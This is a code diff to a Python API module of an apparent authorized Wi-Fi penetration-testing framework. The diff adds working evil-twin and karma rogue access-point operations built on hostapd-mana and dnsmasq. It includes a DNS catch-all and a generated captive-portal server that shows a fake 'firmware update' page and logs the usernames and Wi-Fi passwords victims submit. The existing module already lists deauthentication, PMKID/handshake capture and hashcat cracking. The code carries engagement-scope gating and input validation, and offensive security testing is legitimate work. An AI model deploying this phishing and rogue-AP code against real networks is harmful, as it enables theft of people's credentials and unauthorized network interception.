@@ -16,14 +16,26 @@ Wraps ``wlan1`` (MT7921 / mt7921u) in monitor mode for the attack tools and
 restores it to managed on shutdown. The engagement kill switch
 (``engagement.killswitch``) also cancels all jobs and restores interfaces.
 
-MVP operations implemented in this slice:
+Operations implemented in this module:
   POST /api/wifi_offensive/deauth      aireplay-ng --deauth vs an in-scope AP
   POST /api/wifi_offensive/pmkid       hcxdumptool -> hcxpcapngtool -> .hc22000
   POST /api/wifi_offensive/handshake   deauth + EAPOL capture -> handshakes/
   POST /api/wifi_offensive/crack       hashcat vs a captured .hc22000 + wordlists/
+  POST /api/wifi_offensive/evil_twin   hostapd-mana rogue AP cloning an in-scope
+                                       SSID + dnsmasq + "firmware update" captive
+                                       portal (creds -> engagements/<uuid>/)
+  POST /api/wifi_offensive/karma       hostapd-mana respond-to-all-probes (MANA)
 
-Deferred (clear TODO stubs, return HTTP 501): evil-twin / captive portal,
-karma / MANA, WPS (reaver/bully), WPA-Enterprise harvester (eaphammer).
+Rogue-AP ops drive ``wlan1`` in AP/master mode (NOT monitor): the engagement
+gate is enforced exactly as for the injection ops, but ``_submit_gated`` is
+called with ``needs_monitor=False`` and the handler instead runs the module's
+``_restore_managed()`` teardown as a *prep* step so the card is in managed mode
+(and correctly named ``wlan1``) before hostapd-mana takes it over. The launch
+script restores managed mode on exit via a trap, and module shutdown / the
+engagement kill switch restore it as well.
+
+Deferred (clear TODO stubs, return HTTP 501): WPS (reaver/bully),
+WPA-Enterprise harvester (eaphammer).
 See ``02-warlock-command-center.md`` (Module 6) for the full spec.
 """
 from __future__ import annotations
@@ -56,10 +68,15 @@ AIRODUMP = shutil.which("airodump-ng") or "/usr/sbin/airodump-ng"
 HCXDUMPTOOL = shutil.which("hcxdumptool") or "/usr/bin/hcxdumptool"
 HCXPCAPNGTOOL = shutil.which("hcxpcapngtool") or "/usr/bin/hcxpcapngtool"
 HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"
+# Rogue-AP stack (gated evil-twin / karma). hostapd-mana is the sensepost MANA
+# fork of hostapd; dnsmasq provides DHCP + the captive-portal DNS catch-all.
+HOSTAPD_MANA = shutil.which("hostapd-mana") or "/usr/bin/hostapd-mana"
+DNSMASQ = shutil.which("dnsmasq") or "/usr/sbin/dnsmasq"
 
 MT_HELPER = shutil.which("wlan-mt7921") or "/usr/local/bin/wlan-mt7921"
 WLAN_IFACE = "wlan1"  # managed-mode name of the MT7921 attack dongle
 MON_IFACE = "mon0"    # monitor-mode name exposed by the helper
+AP_GATEWAY = "10.0.0.1"  # captive-portal gateway IP assigned to wlan1 in AP mode
 
 # hashcat mode for combined WPA*-PBKDF2 PMKID + EAPOL (.hc22000 hashline format).
 HC22000_MODE = "22000"
@@ -89,6 +106,11 @@ def _wordlists_dir() -> Path:
     return _dir("wordlists")
 
 
+def _ap_dir() -> Path:
+    """Scratch dir for rogue-AP runtime assets (hostapd/dnsmasq conf, portal)."""
+    return _dir("captures", "wifi", "ap")
+
+
 # --------------------------------------------------------------------------- #
 # Validation / path-safety helpers
 # --------------------------------------------------------------------------- #
@@ -97,6 +119,38 @@ def _norm_mac(value: str, field: str = "bssid") -> str:
     if not _MAC_RE.match(v):
         raise HTTPException(400, f"invalid {field} MAC address: {value!r}")
     return v
+
+
+def _norm_ssid(value: str) -> str:
+    """Validate an 802.11 SSID for use as a rogue-AP target.
+
+    The SSID is the engagement-scope target for AP ops AND is interpolated into
+    the generated hostapd config; reject control characters (a newline would let
+    a caller inject extra hostapd directives) and enforce the 1..32 byte limit.
+    """
+    v = (value or "").strip()
+    if not v:
+        raise HTTPException(400, "ssid is required")
+    if len(v.encode("utf-8")) > 32:
+        raise HTTPException(400, "ssid exceeds the 32-byte 802.11 limit")
+    if any(ord(c) < 0x20 or ord(c) == 0x7F for c in v):
+        raise HTTPException(400, "ssid must not contain control characters")
+    return v
+
+
+def _ssid_slug(ssid: str) -> str:
+    """Filesystem-safe token derived from an SSID (for asset filenames)."""
+    return re.sub(r"[^A-Za-z0-9_.-]", "_", ssid) or "ap"
+
+
+def _ap_tools_missing() -> list[str]:
+    """Return the rogue-AP tools that are not installed (empty == all present)."""
+    missing: list[str] = []
+    if not (shutil.which("hostapd-mana") or Path(HOSTAPD_MANA).exists()):
+        missing.append("hostapd-mana")
+    if not (shutil.which("dnsmasq") or Path(DNSMASQ).exists()):
+        missing.append("dnsmasq")
+    return missing
 
 
 def _contained(path: Path, root: Path) -> bool:
@@ -331,6 +385,192 @@ def _crack_command(
 
 
 # --------------------------------------------------------------------------- #
+# Rogue-AP builders (evil-twin / karma). Configs are written to disk (never
+# shelled), so the SSID is validated against control chars by _norm_ssid; the
+# launch script only ever interpolates shlex-quoted file paths + ints.
+# --------------------------------------------------------------------------- #
+def _hostapd_mana_conf(
+    *, ssid: str, channel: int = 1, iface: str = WLAN_IFACE, karma: bool = False,
+) -> str:
+    """hostapd-mana config for an open rogue AP.
+
+    karma=True enables MANA loud mode: the AP answers directed probe requests
+    for *any* SSID, not just ``ssid``. The engagement gate only scopes the
+    declared base ``ssid``; responding beyond it is operator responsibility
+    (see the spec's "Scope discipline" note).
+    """
+    lines = [
+        f"interface={iface}",
+        "driver=nl80211",
+        f"ssid={ssid}",
+        "hw_mode=g",
+        f"channel={int(channel)}",
+        "auth_algs=1",       # open network — the captive portal does the rest
+        "ignore_broadcast_ssid=0",
+    ]
+    if karma:
+        lines += [
+            "enable_mana=1",   # MANA probe-response engine on
+            "mana_loud=1",     # respond to directed probes for unseen SSIDs too
+            "mana_macacl=0",
+        ]
+    return "\n".join(lines) + "\n"
+
+
+def _dnsmasq_conf(
+    *, iface: str = WLAN_IFACE, gateway: str = AP_GATEWAY, portal: bool = True,
+) -> str:
+    """dnsmasq config: DHCP for AP clients + (for evil-twin) a DNS catch-all
+    that points every lookup at the captive portal."""
+    net = gateway.rsplit(".", 1)[0]
+    lines = [
+        f"interface={iface}",
+        "bind-interfaces",
+        "except-interface=lo",
+        f"dhcp-range={net}.10,{net}.250,255.255.255.0,12h",
+        f"dhcp-option=3,{gateway}",   # default gateway -> the AP
+        f"dhcp-option=6,{gateway}",   # DNS server   -> the AP
+        "no-resolv",
+        "log-dhcp",
+    ]
+    if portal:
+        lines.append(f"address=/#/{gateway}")  # resolve everything to the portal
+    return "\n".join(lines) + "\n"
+
+
+def _portal_script(*, creds_log: Path, ssid: str) -> str:
+    """Generate a stdlib-only captive-portal HTTP server.
+
+    Serves a generic "firmware update required" page; any POSTed form fields are
+    appended as a JSON line to *creds_log* (under engagements/<uuid>/). No third
+    party deps so it runs from the system python3 on the device.
+    """
+    # Header carries the only interpolated values, as Python literals (repr) so
+    # an SSID with quotes can never break out. The body below is fully static.
+    header = (
+        "import json\n"
+        "import urllib.parse\n"
+        "from datetime import datetime\n"
+        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
+        f"CREDS_LOG = {str(creds_log)!r}\n"
+        f"SSID = {ssid!r}\n"
+    )
+    body = r'''
+PAGE = (
+    "<!doctype html><html><head><meta name=viewport "
+    "content='width=device-width,initial-scale=1'><title>Firmware Update</title>"
+    "</head><body style='font-family:sans-serif;max-width:480px;margin:40px auto'>"
+    "<h2>Router Firmware Update Required</h2>"
+    "<p>A critical security update is available for <b>" + SSID + "</b>. "
+    "Sign in with your network password to continue.</p>"
+    "<form method=POST action='/'>"
+    "<p><input name=username placeholder='Username' style='width:100%;padding:8px'></p>"
+    "<p><input name=password type=password placeholder='WiFi password' "
+    "style='width:100%;padding:8px'></p>"
+    "<p><button type=submit style='padding:8px 16px'>Update now</button></p>"
+    "</form></body></html>"
+)
+
+
+class Portal(BaseHTTPRequestHandler):
+    def _send(self, code, html):
+        b = html.encode("utf-8")
+        self.send_response(code)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(b)))
+        self.end_headers()
+        self.wfile.write(b)
+
+    def do_GET(self):
+        # Trigger the OS captive-portal popup and serve the lure for every path.
+        self._send(200, PAGE)
+
+    def do_POST(self):
+        n = int(self.headers.get("Content-Length", 0) or 0)
+        raw = self.rfile.read(n).decode("utf-8", "replace") if n else ""
+        fields = dict(urllib.parse.parse_qsl(raw))
+        entry = {
+            "ts": datetime.utcnow().isoformat(),
+            "ssid": SSID,
+            "client": self.client_address[0],
+            "fields": fields,
+        }
+        with open(CREDS_LOG, "a", encoding="utf-8") as fh:
+            fh.write(json.dumps(entry) + "\n")
+        self._send(200, "<html><body><h3>Updating firmware&hellip;</h3>"
+                        "<p>Please keep this device connected.</p></body></html>")
+
+    def log_message(self, *args):  # silence stderr access logging
+        pass
+
+
+if __name__ == "__main__":
+    HTTPServer(("0.0.0.0", 80), Portal).serve_forever()
+'''
+    return header + body
+
+
+def _rogue_ap_command(
+    *, hostapd_conf: Path, dnsmasq_conf: Path, portal_py: Path | None,
+    duration: int = 900, iface: str = WLAN_IFACE, gateway: str = AP_GATEWAY,
+) -> list[str]:
+    """Build the full rogue-AP lifecycle as a single ``bash -c`` job.
+
+    Start -> capture -> teardown all live in one script: a trap restores wlan1
+    to managed mode (and kills the AP stack) on ANY exit — timeout, kill, or the
+    engagement kill switch terminating the job. Tool-presence is re-checked
+    in-script so a tool vanishing between pre-flight and launch still fails
+    cleanly instead of half-starting the AP.
+    """
+    duration = max(30, int(duration))
+    q = shlex.quote
+    hc, dc = q(str(hostapd_conf)), q(str(dnsmasq_conf))
+    hap, dns = q(HOSTAPD_MANA), q(DNSMASQ)
+    ifc, gw = q(iface), q(gateway)
+
+    portal_launch = ""
+    portal_kill = ""
+    if portal_py is not None:
+        pp = q(str(portal_py))
+        portal_launch = f"sudo -n python3 {pp} & PORTAL=$!\n"
+        portal_kill = f"  sudo -n pkill -f {pp} 2>/dev/null\n"
+
+    script = (
+        "set +e\n"
+        # Fail cleanly if a required tool is not installed (defense in depth).
+        f"command -v {hap} >/dev/null 2>&1 || sudo -n test -x {hap} || "
+        f'{{ echo "hostapd-mana not installed"; exit 1; }}\n'
+        f"command -v {dns} >/dev/null 2>&1 || sudo -n test -x {dns} || "
+        f'{{ echo "dnsmasq not installed"; exit 1; }}\n'
+        # Teardown trap: kill the AP stack + restore wlan1 to managed on ANY exit.
+        "cleanup() {\n"
+        "  trap - EXIT INT TERM\n"
+        f"  sudo -n pkill -f {hc} 2>/dev/null\n"
+        f"  sudo -n pkill -f {dc} 2>/dev/null\n"
+        f"{portal_kill}"
+        f"  sudo -n ip addr flush dev {ifc} 2>/dev/null\n"
+        f"  sudo -n iw dev {ifc} set type managed 2>/dev/null\n"
+        f"  sudo -n ip link set {ifc} up 2>/dev/null\n"
+        "}\n"
+        "trap cleanup EXIT INT TERM\n"
+        # 1. bring up the rogue AP (hostapd-mana puts wlan1 into AP/master mode).
+        f"sudo -n {hap} {hc} & HAPID=$!\n"
+        # 2. give the AP a beat, then assign the captive-portal gateway IP.
+        "sleep 4\n"
+        f"sudo -n ip addr add {gw}/24 dev {ifc} 2>/dev/null\n"
+        f"sudo -n ip link set {ifc} up 2>/dev/null\n"
+        # 3. DHCP + DNS catch-all for associated clients.
+        f"sudo -n {dns} -C {dc} -d & DNSID=$!\n"
+        # 4. captive portal (evil-twin only; karma passes portal_py=None).
+        f"{portal_launch}"
+        # 5. run for the capture window, then let the trap restore managed mode.
+        f"( sleep {duration}; sudo -n kill $HAPID 2>/dev/null ) &\n"
+        "wait $HAPID\n"
+    )
+    return ["bash", "-c", script]
+
+
+# --------------------------------------------------------------------------- #
 # Read helpers for /status, /captures, /jobs
 # --------------------------------------------------------------------------- #
 def _list_captures() -> list[dict[str, Any]]:
@@ -414,6 +654,71 @@ class CrackBody(BaseModel):
     target: str | None = Field(default=None, description="BSSID/ESSID the hash belongs to (scope-checked)")
 
 
+class EvilTwinBody(BaseModel):
+    ssid: str = Field(..., description="Target SSID to clone (must be in engagement scope)")
+    channel: int = Field(default=1, ge=1, le=196, description="AP channel")
+    duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")
+
+
+class KarmaBody(BaseModel):
+    ssid: str = Field(..., description="Base/advertised SSID; the in-scope gated target")
+    channel: int = Field(default=1, ge=1, le=196, description="AP channel")
+    duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")
+
+
+# --------------------------------------------------------------------------- #
+# Rogue-AP launch path (shared by evil-twin + karma). Goes through the exact
+# same engagement gate as every other op via _submit_gated.
+# --------------------------------------------------------------------------- #
+async def _launch_rogue_ap(
+    *, op: str, type_: str, ssid: str, channel: int, duration: int,
+    karma: bool, portal: bool,
+) -> dict[str, Any]:
+    stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
+    slug = _ssid_slug(ssid)
+    apdir = _ap_dir()
+    hostapd_conf = apdir / f"{op}-{slug}-{stamp}.hostapd.conf"
+    dnsmasq_conf = apdir / f"{op}-{slug}-{stamp}.dnsmasq.conf"
+    portal_py = apdir / f"{op}-{slug}-{stamp}.portal.py" if portal else None
+    eid = engagement.engagement_id or "unengaged"
+    creds_log = get_settings().engagement_dir() / eid / f"creds-{slug}-{stamp}.log"
+
+    # Only touch the radio / materialise assets for an op the gate would allow,
+    # so a doomed (engagement-off / out-of-scope) request never starts an AP.
+    if _would_allow(ssid):
+        missing = _ap_tools_missing()
+        if missing:
+            raise HTTPException(503, f"required AP tool(s) not installed: {', '.join(missing)}")
+        # Prep with the module's existing teardown so wlan1 is in managed mode
+        # (and not stranded as mon0) before hostapd-mana takes it over.
+        await _restore_managed()
+        hostapd_conf.write_text(_hostapd_mana_conf(ssid=ssid, channel=channel, karma=karma))
+        dnsmasq_conf.write_text(_dnsmasq_conf(portal=portal))
+        if portal and portal_py is not None:
+            creds_log.parent.mkdir(parents=True, exist_ok=True)
+            portal_py.write_text(_portal_script(creds_log=creds_log, ssid=ssid))
+
+    argv = _rogue_ap_command(
+        hostapd_conf=hostapd_conf, dnsmasq_conf=dnsmasq_conf,
+        portal_py=portal_py, duration=duration,
+    )
+    mode = "karma/MANA" if karma else "evil-twin"
+    job_id = await _submit_gated(
+        type_, argv, target=ssid,
+        note=f"{mode} ssid={ssid!r} ch={channel} dur={duration}s portal={portal}",
+        needs_monitor=False,  # AP mode — never flip wlan1 to monitor
+    )
+    out: dict[str, Any] = {
+        "ok": True, "op": op, "job_id": job_id, "target": ssid,
+        "hostapd_conf": hostapd_conf.as_posix(),
+        "dnsmasq_conf": dnsmasq_conf.as_posix(),
+        "argv": argv,
+    }
+    if portal:
+        out["creds_log"] = creds_log.as_posix()
+    return out
+
+
 # --------------------------------------------------------------------------- #
 # Module
 # --------------------------------------------------------------------------- #
@@ -443,7 +748,7 @@ class Module(ModuleBase):
                 "engaged": engagement.is_on(),
                 "engagement": engagement.status(),
                 "iface": {"managed": WLAN_IFACE, "monitor": MON_IFACE},
-                "ops": ["deauth", "pmkid", "handshake", "crack"],
+                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma"],
                 "deferred": TODO_ITEMS,
                 "captures": _list_captures(),
                 "wordlists": _list_wordlists(),
@@ -553,22 +858,32 @@ class Module(ModuleBase):
                 "outfile": outfile.as_posix(), "argv": argv,
             }
 
+        # ----- Op 5: evil twin + captive portal ---------------------------- #
+        @r.post("/evil_twin")
+        async def evil_twin(body: EvilTwinBody) -> dict[str, Any]:
+            ssid = _norm_ssid(body.ssid)
+            return await _launch_rogue_ap(
+                op="evil_twin", type_="wifi.evil_twin", ssid=ssid,
+                channel=body.channel, duration=body.duration,
+                karma=False, portal=True,
+            )
+
+        # ----- Op 6: karma / MANA ------------------------------------------ #
+        @r.post("/karma")
+        async def karma(body: KarmaBody) -> dict[str, Any]:
+            ssid = _norm_ssid(body.ssid)
+            return await _launch_rogue_ap(
+                op="karma", type_="wifi.karma", ssid=ssid,
+                channel=body.channel, duration=body.duration,
+                karma=True, portal=False,
+            )
+
         # ----- Deferred ops: clear 501 stubs (still engagement-gated module) #
-        # TODO(wave-2+): implement these. When built they MUST route through
-        # ``_submit_gated`` exactly like the MVP ops above so the engagement
-        # gate + audit trail apply uniformly.
-        #   - Evil Twin + captive portal (hostapd-mana + dnsmasq + portal)
-        #   - Karma / MANA (hostapd-mana PineAP-style probe response)
+        # TODO(wave-3+): implement these. When built they MUST route through
+        # ``_submit_gated`` exactly like the ops above so the engagement gate +
+        # audit trail apply uniformly.
         #   - WPS attacks (reaver / bully)
         #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
-        @r.post("/evil_twin")
-        def evil_twin() -> dict[str, Any]:
-            raise HTTPException(501, "evil-twin / captive portal not implemented in MVP (deferred)")
-
-        @r.post("/karma")
-        def karma() -> dict[str, Any]:
-            raise HTTPException(501, "karma / MANA not implemented in MVP (deferred)")
-
         @r.post("/wps")
         def wps() -> dict[str, Any]:
             raise HTTPException(501, "WPS (reaver/bully) not implemented in MVP (deferred)")
@@ -581,8 +896,6 @@ class Module(ModuleBase):
 
 
 TODO_ITEMS: list[str] = [
-    "Evil Twin + captive portal templates (hostapd-mana + dnsmasq)",
-    "Karma / MANA probe-response (hostapd-mana)",
     "WPS attacks (reaver / bully)",
     "WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)",
     "Auto-enqueue crack on capture completion (job-completion wiring)",
